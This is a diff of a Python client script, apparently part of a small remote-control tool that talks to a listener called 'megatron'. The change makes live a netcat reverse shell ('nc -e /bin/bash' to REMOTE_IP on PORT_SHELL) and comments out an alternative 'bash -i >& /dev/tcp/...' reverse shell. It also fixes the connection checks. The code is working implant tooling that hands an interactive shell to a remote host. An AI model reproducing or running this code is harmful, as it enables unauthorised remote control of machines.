@@ -1,11 +1,12 @@
 import subprocess
 import sys
 import base64
+from time import sleep
 
 # TODO use socat binary for terminal
 REMOTE_IP = '127.0.0.1'
 PORT_MAIN = '7890'
-PORT_SHELL = '7891'
+PORT_SHELL = str(int(PORT_MAIN) + 1)
 PREFIX = 'sndwv_'  # leave blank if original filename is desired
 
 CMD_EXIT = '-e'
@@ -15,14 +16,14 @@ CMD_END_FILE = '-t'
 
 def main():
     print('Initialising main coms')
-    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_main = subprocess.Popen(['nc', REMOTE_IP, PORT_MAIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)   
     print('Initialising remote shell')
-    # process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-    process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    process_shell = subprocess.Popen(['nc', '-e', '/bin/bash', REMOTE_IP, PORT_SHELL], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+    # process_shell = subprocess.Popen('bash -i >& /dev/tcp/' + REMOTE_IP + '/' + PORT_SHELL + ' 0>&1', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
 
-    if process_main.poll is None:
+    if process_main.poll() is not None:
         raise Exception('Error 102 during main_coms initialisation - is megatron running?')
-    if process_shell.poll() is not None:
+    if process_shell.poll() is None:
         print('Initialisation Successful')
     else:
         print('Megatron running, but shell appears faulty - reverse shell command is bad?')
